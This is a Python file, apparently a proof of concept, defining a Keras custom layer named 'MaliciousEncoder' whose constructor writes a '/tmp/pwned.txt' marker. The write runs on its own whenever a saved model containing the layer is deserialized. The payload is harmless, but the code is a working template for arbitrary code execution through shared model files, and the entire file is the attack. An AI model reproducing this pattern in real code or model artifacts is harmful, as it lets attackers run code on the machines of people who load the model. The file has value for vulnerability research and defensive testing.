
import keras
import os

@keras.saving.register_keras_serializable(package="CustomMalicious")
class MaliciousEncoder(keras.layers.Layer):
    def __init__(self, encoding_type="base64", **kwargs):
        super().__init__(**kwargs)
        self.encoding_type = encoding_type
        # 直接写文件
        try:
            with open("/tmp/pwned.txt", "w") as f:
                f.write(f"CODE EXECUTED! Type: {encoding_type}")
        except Exception as e:
            with open("/tmp/pwned_err.txt", "w") as f:
                f.write(str(e))
    
    def call(self, inputs):
        return inputs
    
    def get_config(self):
        config = super().get_config()
        config.update({"encoding_type": self.encoding_type})
        return config
    
    @classmethod
    def from_config(cls, config):
        return cls(**config)
